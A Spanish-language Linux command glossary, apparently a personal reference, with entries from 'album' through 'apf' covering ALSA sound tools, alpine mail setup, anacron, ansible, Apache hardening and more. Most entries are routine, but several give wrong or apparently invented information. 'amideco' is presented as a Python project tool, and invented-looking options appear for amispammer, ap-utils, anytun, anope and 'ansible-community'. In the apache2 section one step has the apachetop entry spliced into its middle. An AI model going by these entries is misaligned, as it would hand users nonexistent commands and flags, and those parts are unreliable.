$ nano fotos/captions.txt
foto1.jpg [una_tabulación] Texto
foto2.jpg [una_tabulación] Texto
foto3.jpg [una_tabulación] Texto
Si deseamos esconder una foto, la comentamos [#] en captions.txt.
Crear el archivo header.txt en el directorio con un texto:
$ nano fotos/header.txt
Fotos vacaciones en la playa
Agregar un final de página (footer):
$ nano fotos/footer.txt
Imágenes libre
Cualquier modificación de archivos o directorios implica actualizar la aplicación:
$ album fotos/


alias
Permite que una cadena de palabras sea sustituida por una más corta.
$ alias ls='ls --color=auto' (Cuando se teclee "ls" se ejecutará su equivalencia)
$ \ls (si "ls" es un alias se ejcutarà sin serlo [ver nota])
# unalias ls  (suprimir el alias)
$ alias (listado de alias activos)
Nota.- Para ejecutar un comando que coincida con un alias pero sin su equivalencia, además de precedirlo con una barra invertida [\] usando como ejemplo el mismo alias ls mencionado, tambien puede hacerse:
$ "ls"
$ 'ls'
$ command ls
$ /usr/bin/ls


alien
Convertir formatos de distintas distribuciones.
$ alien --to-deb paquete (convertir a .deb)
$ alien  --to-rpm paquete (a .rpm)
$ alien  --to-tgz paquete (a .tgs)
$ alien -i  --to-deb paquete   (convertirá “paquete” y lo instalará)


alpine
Gestor de correo. Antes de proseguir, si queremos que nos guarde la contraseña del correo crear el archivo:
$ touch .pine-passfile
La primera vez que lo lancemos creará el archivo .pinerc y mostrará un mensaje al que pulsaremos "intro" para entrar en el menú principal. Seleccionar "setup" y C. Del montón de parámetros que pueden personalizarse, sólo son imprescindibles 4:
"Personal name" [Shift + c para editarlo y en la parte inferior aparecerá el editor con el cursor parpadeando] Entramos el nombre del correo:
usuario@correo.com [intro]
"User Domain". Lo editamos [Shft + c] y colocamos:
	correo.com [intro]
(gmail.com, gmx.es.... según se trate)
	"SMTP Server". [Shft + c] y entramos:
	smtp.correo.com:587/tls/novalidate-cert/user=usuario@correo.com [intro]
	"Inbox Path". [Shft + c] y ponemos:
	{pop.correo.com/pop3/ssl/novalidate-cert/user=usuario@correo.com}INBOX
Intro y para salir de la configuración pulsar:
	Shift + e
Preguntará si se salvan los datos. Pulsar "y" y regresamos al menú. Para entrar en el correo, seleccionar "FOLDER LIST" Preguntará la contraseña y si queremos guardarla [lo hace en el archivo .pine-passfile]
En "COMPOSE MESSAGE" se entran los correos separados por "," en el apartado Cc [copia oculta] o To. Ctrl + x para enviar.


alsa-info
Información sobre los dispositivos alsa.
$ alsa-info


alsa-utils
[Advanced Linux Sound Architecture]. Modulo del nucleo de Linux que sustituye diferentes controladores de targetas de sonido con un solo dispositivo de controlador el cual tiene la capacidad de controlar diversas targetas. Incluye las siguientes herramientas: alsactl [controles avanzados para controladores de sonido ALSA], alsaloop [crea loopbacks entre dispositivos de captura y reproducción PCM], alsamixer [mezclador de curses], alsaucm [administrador de casos de uso de alsa], amixer [mezclador de línea de comandos], amidi [lee y escribe en puertos RawMIDI de ALSA], aplay [reproducción], arecord [grabación], aplaymidi [reproducción], arecordmidi [grabación de MIDI], aconnect, aseqnet, aseqdump [control de secuenciador MIDI], iecset [establece o descarga bits de estado IEC958] y speakers-test [generador de tonos de prueba de altavoces]


alsabat
Probador de sonido para controlador de tarjeta de sonido alsa.
$ alsabat (básico)
$ alsabat -P plughw:0,0 -C plughw:0,0 --file 500Hz.wav
$ alsabat -P plughw:0,0 -C plughw:0,0 -c 2 -f S32_LE -F 250


alsabat-test
Testeo de la tarjeta de sonido
$ alsabat-test


alsactl
Se usa para controlar la configuración avanzada de los controladores de la tarjeta de sonido ALSA.
# alsactl store (guarda el estado del controlador actual para la tarjeta de sonido seleccionada en el archivo de configuración)
# alsactl restore (carga el estado del controlador para la tarjeta de sonido seleccionada desde el archivo de configuración)


alsaloop
Permite crear un bucle de retorno PCM entre un dispositivo de captura de PCM y un dispositivo de reproducción de PCM.
$ alsaloop -C hw:0,0 -P hw:1,0 -t 50000


alsamixer
Mezclador de tarjeta de sonido para el controlador ALSA
$ alsamixer
$ alsamixer -V all (ver todas las opciones de salida)
1.-
Guardar la configuración del volumen:
# nano /etc/pulse/default.pa
Comentar, como se muestra, la linea:
#load-module module-device-restore


alsaucm
Permite a las aplicaciones acceder al hardware de forma abstracta
$ alsaucm -n listcards (no abrir la primera tarjeta encontrada [-n] y enumerar las tarjetas disponibles)
$ alsaucm -n reload (releer la configuración)
$ alsaucm -n reset (restablecer la tarjeta de sonido al estado predeterminado)


altavoz
Apagar el altavoz interno del pc
# gedit /etc/modprobe.d/blacklist
Y añadiremos la linea:
	blacklist pcspkr


amideco
Herramienta que se utiliza para crear y gestionar proyectos de desarrollo de software en Python
$ amideco create /project (crear un proyecto)
Entrar en el directorio y en él:
$ amideco run (iniciar un servidor local)
$ amideco install requests (instalar dependencias)
$ amideco update (actualizar dependencias)
$ amideco test (ejecutar pruebas)
$ amideco docs generate (generar documentación)
$ amideco nfig set ENVIRONMENT_VARIABLE=value (configurar variables de entorno)
$ amideco cache clear (limpiar caché)


amidi
Relativo a los dispositivos midi.
$ amidi -l     (listar los dispositivos MIDI de ALSA-utils)


amispammer
Herramienta que se utiliza para analizar archivos de registros de correo electrónico y detectar patrones de comportamiento que puedan indicar actividad de spam o comprobar si una o más direcciones IP o todos los registros de dominios MX aparecen en las listas negras más importantes.
$ amispammer -f /archivo.log (analizar un archivo de registro de correos)
$ amispammer -f /archivo.log -t 100 (que marque las direcciones IP que hayan enviado al menos 100 mensajes)
$ amispammer -f /archivo.log -i 60 (buscará actividad de spam dentro del último período de 60 minutos en los registros)
$ amispammer -f /archivo.log -o /reporte.txt (generar un reporte detallado en un archivo)
$ amispammer -f /archivo.log -v (obtener más detalles)
$ amispammer -f /archivo.log --exclude 192.168.1.1 (ignorar direcciones IP específicas conocidas y confiables)
Supongamos un ejemplo completo en el que se quiere analizar el archivo /var/log/mail.log para detectar IPs que enviaron más de 50 mensajes en los últimos 120 minutos, guardando el resultado en un archivo de reporte y excluyendo una IP específica:
$ amispammer -f /var/log/mail.log -t 50 -i 120 -o /var/log/reporte_spam.txt --exclude 203.0.113.5 -v


amixer
Bajar el volumen
$ amixer sset Master 50%-   (Bajar un 50% del volumen)
$ amixer sset Master 30%+  (Sube un 30% el volumen)


ample
Servidor MP3 simple escrito en C que no admite mezclas, programas de radio, etc, solo está pensado para ser una manera fácil de escuchar de forma remota MP3.
$ ample -p 8080 -d /musica/mp3 (reproducir los archivos de la carpeta mp3 en http://localhost:8080 o con http://IP:8080)


an
Generar anagramas para una palabra o frase proporcionada por el usuario.
$ an -c 'lin' 'genial' (que empiece por las letras "lin" contenidas en "genial")
$ an -l 4 'linux' (limitando el número de anagramas a los de máximo 4 palabras o silabas)
$ an -m 3 'juan gomez' (solo poner grupos de palabras de 3 letres)


anacron
Puede utilizarse para ejecutar comandos periódicamente, con una frecuencia especificada en días.  A diferencia de cron [ver], no asume que la máquina esté funcionando continuamente.  Por lo tanto, puede usarse en máquinas que no funcionan 24 horas al día, para controlar tareas diarias, semanales y mensuales que normalmente se usa cron. Si cuando ha llevarse a cabo la tarea la máquina está apagada, la próxima vez que sea iniciada esperara los minutos especificados en "delay" y realizara la tarea indicada sin esperar al día siguiente. En el archivo de configuración /etc/anacrontab se han de specificar las tareas con el siguiente esquema: periodo_tarea retardo_ejecución identificador comando
    periodad_tarea: frecuencia con la cual se realizará la tarea: @daily o 1 [diario], @weekly o 7 [semanal],  @monthly o 30 [mensual] o 50 [cada 50 dias]
    retarde_ejecución: Indica la cantidad de minutos antes de ser ejecutada la tarea.
    identificador: Nombre que damos a la tarea.
    Comando: Comando o script que será ejecutado.
En el archivo /etc/anacrontab, si debajo de LOGNAME= root añadimos START_HOURS_RANGE=23-6, entonces los trabajos únicamente se ejecutarán entre las 23 de la noche y las 6 de la madrugada. Otra opción es añadir el parámetro RANDOM_DELAY=15 que lo que hará este parámetro es añadir un retardo aleatorio adicional de 0 a 15 minutos a cada una de las tareas que se van a ejecutar para repartir mejor la carga del sistema.
# anacron -f (forzar la ejecución de las tareas, igorando las marcas de tiempo)
# anacron -u ( actualiza las marcas de tiempo de los trabajos, a la fecha actual, pero no ejecuta nada)
# anacron -n (Ejecute las tareas ahora, ignorando cualquier retraso)
# anacron -d -s (realizar las tareas ahora de forma secuenciada, primero las diarias, luego las semanales y al final las mensuales)
# cat /var/spool/anacron/cron.daily (consultar la fecha en que se ejecutaron la totalidad de scripts guardados en, por ejemplo, cron.daily, igual para  cron.monthly y cron.weekly)
Ejemplo de bakup semanal:
# nano /etc/anacrontab
Y colocar la linea:
  7 5 backup.semanal /bin/bash /home/user/bin/backup.sh
Significa que cada 7 dias, 5 minutos arriba o abajo y con el nombre backup.semanal se lanzando el script backup.sh ejecutado por bash.


analog
Procesador de archivos de registro rápido que genera informes y estadísticas de uso de servidores web. Puede procesar millones de líneas por minuto, escalable, flexible, salida en HTML, maneja muchos formatos de archivos de registro y, además de por linea de comandos, puede utilizar una interfaz web.
# analog +Oanalog.html ([letra "o" mayuscula y justo a continuación el nombre] Genera el informe "analog.html")
# analog (Muestra la salida por consola)


anarchism
Historia del anarquismo en inglés. Acceder al contenido mediante el navegador.
file:///usr/share/doc/anarchism/html/index.html


anamnesis
Gestor del portapapeles. Almacena el historial del portapapeles y ofrece una interfaz para hacer búsquedas de todo lo copiado. Descarga de: <http://sourceforge.net/projects/anamnesis/> Una	vez descomprimido copiar la carpeta en:
    # cp anamnesis-1.0.4 /usr/local/
Colocar	el ejecutable en el path:
    # ln -s	/usr/local/anemnesis-1.0.4/source/anemnesis.py /usr/bin/anemnesis
$ anamnesis --start (Arrancar sesión. Otras opciones: restart, stop)
$ anamnesis -b (Ver el historial. Con intro o cambiando de escritorio desaparece)
$ anamnesis -l 3 (Mostrar los últimos 3 datos guardados)
$ anamnesis -l 5 --filter="palabra" (Buscar en los últimos 5 datos el que contine "palabra")
$ anamnesis -a "Historial del Portapapeles" (Ponerle un título)
$ anamnesis --remove = 5 (Eliminar el registro del ID número 5)


and
Demonio automático que se activa en ciertos intervalos y renueva los trabajos según su prioridad y uso de CPU. Archivo de configuración en /etc/and.conf
$ systemctl status and.service (saber si estñá activo)


anillo de claves
Suprimir el “desbloquear anillo de claves”
$ rm -Rf .gnome2/keyrings/login.keyring
# killall gnome-keyring-daemon  (matar el demonio)


animate
[imagemagick]. visualizar gif.
$ animate vuelo.gif


anonip
Comando útil para anonimizar direcciones IP en registros, enmascarando los últimos bits de direcciones IPv4 e IPv6.
# anonip -f /var/log/auth.log (procesará todas las direcciones IP en el archivo especificado, enmascarando los últimos bits y anonimizando las direcciones)
# anonip -f /var/log/auth.log -4 8 (dejar las direcciones IPv4 con los últimos 8 bits enmascarados, como 192.168.1.0)
# anonip -f /var/log/auth.log -6 32 (enmascarar los últimos 32 bits de las direcciones IPv6)
# cat /var/log/auth.log | anonip (enmascarar las direcciones IP de la salida del comando cat directamente en la consola)
# anonip -f /var/log/auth.log -o /var/log/auth_anonimizado.log (anonimizar y guardar en un archivo de salida)
# anonip -f /var/log/auth.log -v (ver más detalles del proceso mientras se ejecuta)
Un ejemplo completo sería anonimizar un archivo de registro /var/log/apache2/access.log, enmascarando los últimos 16 bits de las direcciones IPv4 y los últimos 48 bits de las direcciones IPv6, y guardando el resultado en un archivo de salida anonimizando todas las IPs que encuentre:
# anonip -f /var/log/apache2/access.log -4 16 -6 48 -o /var/log/apache2/access_anonimizado.log -v


anon-proxy
Navegación anónima via proxy. los archivos de configuración en /etc/efault/anon-proxy.
# /etc/init.d/anon-proxy start (Arrancar el proxy)
Configurar el navegador con localhost y el puerto 4001


anope
Conjunto de servicios diseñado para facilitar la administración de redes IRC [Internet Relay Chat], proporcionando herramientas para gestionar canales, usuarios y permisos.
# anope --services (iniciar en modo servicios para una red IRC)
# anope --debug (ver información detallada del funcionamiento)
        /msg NickServ REGISTER <password> <email> (registrar el nick actual bajo tu cuenta)
        /msg ChanServ REGISTER #canal <password> <descripción> (asigna el control del canal especificado)
        /msg BotServ ASSIGN #canal <botname> (asignar bots a canales y administrar acciones automáticas)
        /msg OperServ STATS (verificar el estado de la red incluyendo conexiones y actividad reciente)


ansi2html
[colorized-logs]. Pasar textos a html.
# ansi2html -w </var/log/apache2/access.log >acces.html (con el fondo blanco)


ansi2txt
[colorized-logs]. Guardar logs a txt.
# ansi2txt </var/log/apache2/access.log >acces.txt


ansible
Sistema de ejecución de tareas remotas, implementación de múltiples nodos y administración de configuración basada en modelos radicalmente simples. Ansible funciona a través de SSH y no requiere que se instale ningún software ni daemon en los nodos remotos. Los módulos de extensión se pueden escribir en cualquier lenguaje y se transfieren a las máquinas administradas automáticamente. Este paquete contiene las colecciones de Ansible: ansible-config, ansible-console, ansible-galaxy, ansible-playbook, ansible-test, ansible-community, ansible-connection, ansible-doc, ansible-inventory, ansible-pull y ansible-vault.
$ ansible-config list (lista todas las opciones de configuración junto con sus valores predeterminados)
$ ansible-config dump --only-changed (muestra solo las configuraciones modificadas respecto a los valores predeterminados)
$ ansible-console -i inventory.yml (abre una consola interactiva con el inventario especificado en inventory.yml, permitiéndo ejecutar comandos directamente)
$ ansible-galaxy install USER.nginx (instala el rol nginx del usuario USER)
$ ansible-galaxy list (muestra los roles y colecciones instalados en el sistema)
$ ansible-playbook playbook.yml --syntax-check (revisa la sintaxis del playbook para asegurar que no haya errores antes de ejecutarlo)
$ ansible-test sanity (ejecuta pruebas de validación estática sobre los módulos y roles definidos)
$ ansible-community init project_name (crea la estructura de carpetas estándar para un nuevo proyecto)
$ ansible-doc apt (muestra la documentación completa del módulo apt)
$ ansible-doc -l (lista todos los módulos disponibles, con una breve descripción de cada uno)
$ ansible-inventory -i inventory.yml --list (muestra el inventario en un formato JSON, útil para validar su configuracion)
$ ansible-pull -U https://github.com/user/repo.git playbook.yml (clona el repositorio especificado de Git y ejecuta playbook.yml en el nodo local
$ ansible-vault create secrets.yml (crear un archivo secrets.yml cifrado, solicitando una contraseña para protegerlo)
$ ansible-vault edit secrets.yml (abrir el archivo secrets.yml para editarlo, solicitando la contraseña configurada)
ansible-connection es un plugin de conexión interna que, generalmente, no se usa directamente sinó que se configura en el archivo de inventario con la linea:
                   server1 ansible_connection=ssh


ansilove
Herramienta útil para convertir archivos de texto en formato ANSI o ASCII a imágenes PNG.
$ ansilove texto.txt -o text.png (tomar el contenido del archivo input.txt que debe estar en formato ANSI y lo convertirá a una imagen PNG)
$ ansilove -f cp737 -m ced input.txt -o output.png (con la fuente cp737 y negro sobre gris, con 78 columnas.)
$ ansilove -i input.txt -o output.png (activar color)


ansiweather
Mostrar información actual de las condiciones meteorológicas, con soporte para colores ANSI y símbolos Unicode. Los datos meteorológicos provienen de OpenWeatherMap
$ ansiweather -l "Olot,ES" -u metric (forma básica)
$ ansiweather -l "Olot,ES" -u metric -s true -f 5 -d true (mostrando pequeños simbolos, luz diurna y previsión para los próximos 5 dias)
$ ansiweather -l "Olot,ES" -u metric -s true -d true -w true -h true (mostrando, viento, luz diurna, humedad, presión, hora amanecer, hora puesta)
Para personalizar la ciudad, traducción y datos concretos para no tener que entrarlos cada vez, bajar el archivo https://github.com/fcambus/ansiweather/blob/master/ansiweatherrc.example y colocarlo como ~/.ansiweather.
   $ cat .ansiweather
   location:Olot,ES
   units:metric
   ...
   humidity_text:Humedad
   pressure_text:Presión
   sunrise_text:Salida
   ...


ant
Herramienta de automatización para proyectos Java que permite compilar, construir y gestionar dependencias a través de archivos XML llamados build.xml.
$ ant (ejecutar una tarea Predeterminada definida en el archivo build.xml)
$ ant compile (si en build.xml existen varias tareas definidas, ejecutar la llamada "compile")
Un archivo build.xml básico para compilar un proyecto podría verse así:
   <project name="miProyecto" default="compile" basedir=".">
       <target name="compile">
               <mkdir dir="build/classes"/>
               <javac srcdir="src" destdir="build/classes"/>
       </target>
   </project>
Esto compilará el código Java desde el directorio src y pondrá los archivos .class en build/classes. Para eliminar archivos temporales y carpetas de compilación previas, se puede definir una tarea clean:
     <target name="clean">
         <delete dir="build/classes"/>
     </target>
Y luego ejecutarla:
$ ant clean
Para empaquetar el proyecto en un archivo JAR, se puede agregar una tarea jar:
     <target name="jar" depends="compile">
         <mkdir dir="build/jar"/>
         <jar destfile="build/jar/miProyecto.jar" basedir="build/classes"/>
     </target>
Y ejecutarla:
$ ant jar
que generará el archivo miProyecto.jar en el directorio build/jar.


antiword
Conversor/lector de archivos .doc
$ antiword archivo.doc | less (Visualiza un doc)
$ antiword -p A4 archivo.doc > archivo.ps (Convierte a ps)
$ antiword -t -w 25 archivo.doc > archivo.txt (Convierte a txt)
Algunas opciones:
	-p (Formato PostScript. 10x14, A3, A4, A5, B4, B5, ejecutivo, folio...)
	-a (Formato Adobe. 10x14, A3, A4, A5, B4, B5, ejecutivo, folio...)
	-t (Salida en forma de texto con formato: negrita, subrayado...)
	-w (Anchura del texto)


anytopnm
convierte la imagen de entrada, que puede estar en cualquiera de los aproximadamente 100 formatos gráficos, a formato PBM, PGM o PPM, dependiendo de la propia naturaleza de la imagen de entrada.
$ anytopnm imagen.jpeg > imagen


anytun
Implementación del protocolo de tunelización segura anycast. Utiliza una interfaz de estilo openvpn y permite construir clústeres de VPN redundantes con equilibrio de carga entre servidores. Incluye las herramientas anytun-config, anytun-controld y anytun-showtables.
# anytun -D -u USER (iniciar un túnel VPN, que se ejecute en primer plano en lugar de convertirse en un demonio [predeterminada] y se ejecuta como USER)
# anytun --local-port 5000 --remote 192.168.1.1 --remote-port 5001 --shared-secret "clave_compartida" (crea un túnel VPN con puerto local 5000, el remoto 192.168.1.1 en el 5001 y clave compartida para la autenticación)
# anytun-config --shared-secret "clave" > anytun.conf (genera un archivo de configuración con la clave compartida y guarda el resultado en anytun.conf)
# anytun-controld --stop --id IP (detiene el túnel identificado con la IP)
# anytun-showtables (mostrar la configuración actual de rutas y las conexiones activas del túnel)


aoeui
Editor de pantalla muy pequeño y eficiente.
$ aoeui -r file.txt (abrir solo lectura)
$ aoeui -s -u file.txt (usar espacios, no tabulaciones, para la sangría automática y tratar file.txt como UTF-8 incluso si contienen codificaciones UTF-8 no válidas)
$ aoeui -t 6 script (establecer la tabulación en 6)
Algunas teclas de control con el editor abierto:
        Ctrl g (ir al princio de la linea)
        Ctrl c (ir al final de la linea)
        Ctrl espacio Ctrl g (ir al principio del párrafo. Si ya está allí, vuelve al principio del párrafo anterior)
        Ctrl espacio Ctrl c (ir al final del párrafo. Si ya está allí, vuelve añ principio del párrafo anterior)
        Ctrl l (mueve la ventana hacia adelante en pantallas completas)
        Ctrl r (mueve la ventana hacia atrás en pantallas completas)
        Ctrl espacio Ctrl r (ir al principio del texto)
        Ctrl espacio Ctrl l (ir al final del texto)
        Ctrl k (con varios textos abiertos, guarda todos los textos modificados)
        Ctrl v (inicia selección. Una vez seleccionado otra vez con "Crtl v" se anula la selección)
        Ctrl d (corta selección)
        Ctrl b (pega selección)
        Ctrl u (deshacer el último comando)
        Ctrl q (salir sin guardar)
        Ctrl espacio Ctrl q (guardar y salir)


aosd_cat
Herramienta de visualización en pantalla. Se puede utilizar para notificaciones en scripts de shell. El archivo "prueba.txt" del ejemplo solo tiene el texto "linux es un sistema genial".
$ aosd_cat -p 3 -R red -S green -u 10000 -f 3000 -o 3000 -a 10 -e 5 -n "Open Sans Extrabold" -i prueba.txt
Opciones de geometría:
         -p, --position (posición en la ventana. El rango válido es de 0 a 8, donde 0 es la esquina superior izquierda y 8 es la esquina inferior derecha. El valor predeterminado es 6)
         -x, --x-offset (desplazamiento de la ventana del eje x desde el punto (0,0). Predeterminado es 50)
         -y, --y-offset (desplazamiento de la ventana del eje y desde el punto (0,0). Predeterminado es -50)
         -e, --shadow-offset (desplazamiento de la sombra. Predeterminado es 2)
         -d, --padding (margen desde el borde hasta el contenido. Predeterminado es 0)
Opciones de apariencia:
         -t, --transparency (modo de transparencia. 0=ninguno, 1=falso, 2=compuesto. Predeterminado es 2)
         -n, --font (fuente. No hay valor predeterminado)
         -w, --width (ancho de ajuste en píxeles. cero, ajustará al ancho de la pantalla o no se ajustará si otros parámetros lo hacen imposible. Predeterminado es 0)
Opciones de coloración:
         -B, --back-color (color de fondo. No hay valor predeterminado)
         -S, --shadow-color (color de la sombra. Predeterminado negro)
         -R, --fore-color (color del primer plano. predeterminado verde)
Opciones de opacidad:
         -b, --back-opacity (opacidad del fondo. Predeterminado es 0)
         -s, --shadow-opacity (opacidad de las sombras. Predeterminado es 192)
         -r, --fore-opacity (opacidad del primer plano. Predeterminado es 255)
Opciones de tiempo:
         -f, --fade-in (tiempo de entrada gradual. Predeterminado es 300)
         -u, --fade-full (tiempo para mostrar con opacidad completa. Predeterminado es 3000)
         -o, --fade-out (tiempo de salida gradual. Predeterminado es 300)
Opciones de desplazamiento hacia atrás:
         -a, --age (límite de eliminación de la antigüedad de las líneas. Predeterminado es 0)
         -l, --lines (límite de eliminación de la cantidad de líneas. Predeterminado es 1)
Opciones de la aplicación:
         -i, --input (fuente del texto de entrada. Predeterminado es -)


aoss
[espeak, alsa-oss, mbrola]. Para que la consola hable.
$ aoss espeak --voices   (ver las opciones idiomáticas)
$ aoss espeak --voices=es (ver las variantes de un idioma)
$ aoss espeak -v es+whisper -p30 linux,es,un,sistema,genial
$ aoss espeak -v es+f4 -p30 “linux es un sistema genial”  (lo mismo entre comillas)
$ aoss espeak -v es+m2 -f archivo.txt  (lee de un archivo txt)
$ aoss espeak -v es -s50 -w archivo.wav "linux es un sistema genial" (Crear un wav)
Opciones:
	-v en (para que hable en inglés)
	-s110 (variar velocidad de dicción. A número más alto, más velocidad)
	-p90 (tesitura de voz. De 0 a 99. Valor alto: agudos. Por defecto 50)
	-a50 (Volumen de salida. De 0 a 200. Por defecto 100)
	-g15 (Silencio entre palabras. Por defecto 10 milisegundo)
	-v es+croak [m1,m2,m3,m4,m5,m6 y whisper] (opciones de voz masculinas)
	-v es+f1 [f2,f3 yf4]  (opciones de voz femeninas)


ap-utils
Conjunto de utilidades para la administración de puntos de acceso inalámbricos.
# ap-auth --ip 192.168.1.1 --user USER --password "PASSW" (autentifica en el punto de acceso con dirección IP 192.168.1.1 usando las credenciales de usuario y contraseña especificadas.)
# ap-config --ip 192.168.1.1 --set-channel 6 (cambia el canal del punto de acceso con dirección IP 192.168.1.1 al canal 6)
# ap-gl --ip 192.168.1.1 (muestra el estado del AP con dirección IP 192.168.1.1, incluyendo el estado de la red, dispositivos conectados y otras métricas relevantes)
# ap-telnet --ip 192.168.1.1 --user USER --password "PASSW" (iniciar una sesión telnet en el punto de acceso)


apache2
Ajustes de apache2
# apache2ctl -M    (Visualizar todos los modulos de apache)
# apache2ctl -S (visualizar el estatus de apache)
# apache2ctl -t  (Comprobar que la configuracion de apache va bien)
# apache2ctl -k graceful  (Reiniciar sin cortar las conexiones de los usuarios)
# apache2ctl -k start  (arrancar el servidor. Equivale a /etc/init.d/apache2 start. Tambien acepta las opciones: stop, restart)
# apache2ctl configtest (Otra forma de comprobar la configuración de apache)
# tail -f /var/log/apache2/access.log  (muestra en tiempo real, accesos, ips...)
# tail -f /var/log/apache2/error.log  (muestra los errores de acceso)
Ajustes
1.-
Ajustes mínimos:
# nano /etc/apache2/apache2.conf
Epecificar la carpeta web y el nombre del servidor web:
	DocumentRoot /var/www
	ServerName localhost
2.-
Permisos de la carpeta web:
# chmod -R 755 /var/www && find /var/www -type d -exec chmod 711 {} \;
3.-
mod_evasive:
Descargar mod_evasive
$ http://www.zdziarski.com/blog/wp-content/uploads/2010/02/mod_evasive_1.10.1.tar.gz
Descomprimir y entrar en la carpeta:
$ tar -zxf mod_evasive_1.10.1.tar.gz
$ cd mod_evasive/
Puede que tengamos que instalar:
# apt-get install apache2-prefork-dev
Compilar el módulo:
# apxs2 -i -a -c mod_evasive20.c
Para confirmar que se ha habilitado lo podemos buscar en:
$ ls /usr/lib/apache2/modules/ | grep evasive
mod_evasive20.so
Reiniciar apache
# /etc/init.d/apache2 restart
Para testear su efectividad:
# perl test.pl
Que viene en el mismo paquete descargado. El resultado correcto:
	HTTP/1.1 200 OK
	HTTP/1.1 200 OK
	HTTP/1.1 200 OK
	HTTP/1.1 2...
	HTTP/1.1 403 Forbidden
	HTTP/1.1 403 Forbidden
	HTTP/1.1 403 Forbi ...
Los parámetros por defecto son suficientes en condiciones "normales". Si se precisa afinar más su configuración, pueden añadirse las siguientes lineas al archivo /etc/apache2/httpd.conf:
	<IfModule mod_evasive20.c>
	DOSHashTableSize    3097
	DOSPageCount        1
	DOSSiteCount        50
	DOSPageInterval     1
	DOSSiteInterval     1
	DOSBlockingPeriod   600
	</IfModule>
Que significa que si una página o cualquier objeto de ella, recibe 50 peticiones por segundo cada segundo la IP será bloqueada durante 600 segundos.
4.-
Para que apache no informe del sistema operativo y versión de apache
# nano /etc/apache2/apache2.conf
Añadir las lineas:
	ServerTokens ProductOnly
	ServerSignature Off
5.-
Ocultar un archivo de la carpeta webapachetop
Comando top [ver] especifico para servidores apache y lanzado al estilo de tail [ver]
# apachetop -f /var/log/apache2/access.log (Monitorear en tiempo real)
# nano /etc/apache2/apache2.conf
Y colocar en su interior:
	<Files archivo_a_ocultar>
	order allow,deny
	deny from all
	</Files>
6.-
Ver peticiones al servidor apache:
# cat /var/log/apache2/access.log | awk '{print($1)}' | sort | uniq -c | sort
# grep "resuming normal operations" /var/log/apache2/error.log | cut -d'[' -f2 | sed -e 's/]//' (La última vez que fué reiniciado)
# ls -od --time-style=+%d-%m-%Y /proc/$(ps axo pid,cmd | grep apache | head -n 1 | sed -e 's/^ *//' | cut -d' ' -f1) | cut -d' ' -f 5 (otra forma)
# (cat /var/log/apache2/*.log; zcat /var/log/apache2/*.gz) | grep "resuming normal operations" | cut -d'[' -f2 | sed -e 's/]//' | sort (Todas las veces que fue reiniciado)
# (cat /var/log/apache2/*.log; zcat /var/log/apache2/*.gz) | grep "resuming normal operations" | wc -l (Cuantas veces se ha reiniciado)
7.-
Crear un directorio web privado:
# nano /etc/apache2/apache2.conf
Agregar el siguiente contenido:
	<Directory /var/www/privado>
	AllowOverride AuthConfig
	</Directory>
Reiniciar apache:
# /etc/init.d/apache2 restart
Crear el archivo .htaccess en el interior del directorio privado:
$ nano /var/www/privado/.htaccess
Agregar el contenido:
	AuthName "Acceso restringido"
	AuthUserFile /var/www/.htpasswd
	AuthType Basic
	require valid-user
Crear el archivo para el usuario con privilegios:
# htpasswd -c /var/www/.htpasswd juan
Entrar la contraseña y confirmación.
Para añadir más usuario con privilegios, sin el parámetro -c:
# htpasswd /var/www/.htpasswd pedro
8.-
Para que las aplicaciones no aparezcan con caracteres extraños y simbolos raros:
# nano /etc/apache2/conf.d/carhset
Y añadir las siguientes lineas:
	AddDefaultCharset UTF-8
	AddDefaultCharset latin1


apache2ctl
[=apachectl] Controlar el funcionamiento y el estado del demonio apache.
$ apache2ctl start (Inicia el demonio. Da error si ya se está ejecutando)
$ apache2ctl stop (lño Detiene)
$ apache2ctl restart (lo reinicia. Si no se está ejecutando, se inicia. Este comando verifica automáticamente los archivos de configuración para detectar los errores más obvios)
$ apache2ctl fullstatus (muestra un informe de estado completo)
$ apache2ctl status (muestra un breve informe de estado. Similar a la opción fullstatus, excepto que se omite la lista de solicitudes que se están atendiendo actualmente)


apacheds
Servidor de directorios basado en Java que implementa el protocolo LDAP y que resulta útil para la gestión de directorios de red.
# apacheds start default (inicia la instancia de ApacheDS llamada default que puede reemplazarse con cualquier otra instancia configurada)
# apacheds stop default (detener una instancia específica de ApacheDS)
# apacheds status default (indica si la instancia "default" está activa o no)


apachetop
Comando top [ver] especifico para servidores apache y lanzado al estilo de tail [ver]
# apachetop -r 10 -f /var/log/apache2/access.log (Monitorear en tiempo real y refrescar datos cada 10 segundos)


apariencia
Tener el escritorio root y de usuario con la misma apariencia . Crear enlaces entre las carpetas que contienen la apariencia de entorno del usuario y las de root:
$ sudo ln -s /home/usuario/.themes /root/.themes
$ sudo ln -s /home/usuario/.icons /root/.icons
$ sudo ln -s /home/usuario/.fonts /root/.fonts


apcupsd
Proporciona administración de energía UPS [Uninterruptible Power Supply] a los productos APC, incluidos la mayoría de los modelos de la serie BackUPS (incluido USB), SmartUPS V/S, SmartUPS (NET/RM) y la serie Matrix. Controla y monitorea el estado del UPS y permite que la computadora funcione durante un período de tiempo específico con energía UPS y luego ejecuta un apagado controlado en caso de una falla de energía prolongada.
# systemctl start apcupsd (activa el monitoreo de energía, manteniendo el UPS en vigilancia para responder ante caídas de voltaje u otros eventos)
# systemctl stop apcupsd (desactiva el monitoreo, por lo que no se realizarán acciones de respaldo en caso de fallas de energía)
# apcaccess status (muestra detalles como el nivel de carga de la batería, tiempo estimado de respaldo, voltaje y otros parámetros importantes)
apcupsd permite configurar el sistema para que se apague automáticamente cuando la batería llegue a un nivel crítico. Esto se define en el archivo de configuración, generalmente ubicado en /etc/apcupsd/apcupsd.conf. Un parámetro clave es MINUTES, que se puede modificar:
# nano /etc/apcupsd/apcupsd.conf
Y poner la linea:
  MINUTES 5
Que hará que el sistema se apague cuando queden 5 minutos de carga de batería.
# apcupsd --killpower (probar cómo respondería el sistema ante un corte de energía real)


apertium
[apertium-en-es...] Traductor de archivos de texto a los legunajes especificados.
$ apertium en-es -u -a file_ingles.txt (Marando las palabras desconocidas con * y las ambiguas con =)
$ apertium en-es text_ingles.txt > traducido.txt


apf
Cortafuegos. Todos los parámetros se configuran en el archivo conf.apf.
# nano /etc/apf/conf.apf
La configuración básica:
	DEVEL_MODE="0" # 1 en pruebas, 0 en producción
	IFACE_IN="eth1" # Interfaces de red
	IFACE_OUT="eth1" # interfaces de red
	IFACE_TRUSTED="eth0" # Si existen interfaces locales
	IG_TCP_CPORTS="21,22,80,110" # Puertos permitidos
	IG_UDP_CPORTS=""IG_UDP_CPORTS="" # Puertos UDP permitidos [si existen]
